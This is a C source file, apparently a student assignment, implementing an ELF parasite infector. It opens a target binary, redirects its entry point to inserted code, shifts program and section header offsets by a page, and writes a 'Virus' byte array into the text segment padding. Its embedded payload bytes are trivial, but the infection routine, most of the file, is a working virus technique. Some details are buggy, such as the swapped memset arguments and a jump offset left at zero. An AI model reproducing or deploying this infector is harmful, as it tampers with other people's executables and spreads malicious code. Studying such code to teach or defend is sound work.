/*
   ELF infector source file
Student:
Student ID:
Class:
 */
#include <stdio.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

//Define PAGESIZE,default 4K byte

#define PAGESIZE 4096

//Parasite Virus Code.The code is copied from Internet.

//xiaofeichar Virus[]={/*Binary code for test*/};
char Virus[]={0x55,0x89,0xe5,0x83,0xec,0x18,0xc7,0x04,0x24,0xd0,0x84,0x04,0x08,0xe8,0x0a,0xff,0xff,0xff,0xc9,0xc3};


int infect(char *ElfFile);
//The size of Virus Code
int VirusSize=sizeof(Virus);
//xiaofeiint jmppoint=/*Jump point of binary code of Virus*/;
int jmppoint=0/*Jump point of binary code of Virus*/;


//Infector Function

int infect(char *ElfFile)
{
	int result=0;
	int Re;
	int FileD;
	int TmpD;
	int OldEntry;
	int OldShoff;
	int OldPhsize;
	int i=0;

	Elf32_Ehdr elfh;
	Elf32_Phdr Phdr;
	Elf32_Shdr Shdr;

	//Open ELF file and read the elf header part to &elfh

	FileD=open(ElfFile,O_RDWR);
	read(FileD,&elfh,sizeof(elfh)); 
	if((strncmp((const char*)elfh.e_ident,ELFMAG,SELFMAG))!=0)
		exit(0);

	//Old entry of original elf file

	OldEntry=elfh.e_entry;
	//Old section header offset of elf file

	OldShoff=elfh.e_shoff;

	//modify the Virus code line"movl "Oldentry",%eax" to jump to old entry

	//after the Virus code excuted

	*(int *)&Virus[jmppoint]=OldEntry;

	//Increase e_shoff by PAGESIZE in the ELF header

	elfh.e_shoff += PAGESIZE;

	//if Virus Size is too large

	if (VirusSize > (PAGESIZE-(elfh.e_entry%PAGESIZE)))
		exit(0);

	int Noff=0;
	//The loop of read and modify program header

	for(i=0;i<elfh.e_phnum;i++)
	{

		//seek and read to &Phdr 

		lseek(FileD,elfh.e_phoff+i*elfh.e_phentsize,SEEK_SET);
		read(FileD,&Phdr,sizeof(Phdr));
		if(Noff)
		{
			//For each phdr who's segment is after the insertion (text segment)

			//increase p_offset by PAGESIZE                

			Phdr.p_offset += PAGESIZE;

			//write back

			lseek(FileD,elfh.e_phoff+i*elfh.e_phentsize,SEEK_SET);
			write(FileD,&Phdr,sizeof(Phdr));
		}

		else if(PT_LOAD == Phdr.p_type && Phdr.p_offset==0)
		{
			if (Phdr.p_filesz != Phdr.p_memsz)
				exit(0);
			// Locate the text segment program header

			//Modify the entry point of the ELF header to point to the new

			//code (p_vaddr + p_filesz)

			elfh.e_entry = Phdr.p_vaddr + Phdr.p_filesz+4;
			lseek(FileD,0,SEEK_SET);

			//Write back the new elf header

			write(FileD,&elfh,sizeof(elfh));
			OldPhsize=Phdr.p_filesz;
			Noff=Phdr.p_offset+Phdr.p_filesz;

			//Increase p_filesz by account for the new code (parasite)

			Phdr.p_filesz += VirusSize;

			//Increase p_memsz to account for the new code (parasite)    

			Phdr.p_memsz += VirusSize;

			//write back the program header

			lseek(FileD,elfh.e_phoff+i*elfh.e_phentsize,SEEK_SET);
			write(FileD,&Phdr,sizeof(Phdr));
		}
	}
	lseek(FileD,OldShoff,SEEK_SET);

	//The loop of read and modify the section header

	for(i=0;i<elfh.e_shnum;i++)
	{

		lseek(FileD,i*sizeof(Shdr)+OldShoff,SEEK_SET);
		Re=read(FileD,&Shdr,sizeof(Shdr));

		if (i==1)
		{
			//For the last shdr in the text segment

			//increase sh_size by the virus size    

			Shdr.sh_size += VirusSize;
		}
		else if(i!=0)
		{
			//For each shdr whoes section resides after the insertion

			//increase sh_offset by PAGESIZE                

			Shdr.sh_offset += PAGESIZE;
		}

		//Write Back

		lseek(FileD,OldShoff+i*sizeof(Shdr),SEEK_SET);
		write(FileD,&Shdr,sizeof(Shdr));

	}

	//To get the file size FileStat.st_size

	struct stat FileStat;
	fstat(FileD,&FileStat);

	char *Data=NULL;
	Data=(char*)malloc(FileStat.st_size-OldPhsize);

	lseek(FileD,OldPhsize,SEEK_SET);
	read(FileD,Data,FileStat.st_size-OldPhsize);

	//Insert the Virus Code to the elf file

	lseek(FileD,OldPhsize,SEEK_SET);
	write(FileD,Virus,sizeof(Virus));
	char tmp[PAGESIZE]={0};

	//Pad to PAGESIZE

	memset(tmp,PAGESIZE-VirusSize,0);
	write(FileD,tmp,PAGESIZE-VirusSize);

	write(FileD,Data,FileStat.st_size-OldPhsize);
	result=1;

	free(Data);

	return result;            

}

void hello(int i1, int i2) {
	int ii1 = i1;
	int ii2 = i2;
	char a[]={'h','e','l','l','o','!','\n',0x00};
	printf(a);
	printf("%d,%d\n", ii1, ii2);
}
//Just for test

int main(int argc,char **argv)
{
	//How to use it

	if (argc!=2)
	{
		printf("Usage : infect <ELF filename>\n");
		exit(0);
	}

	int test=infect(argv[1]);
	if(test != 1)
	{
		exit(0);
	} 
	hello(1,1);
	return 0;
}
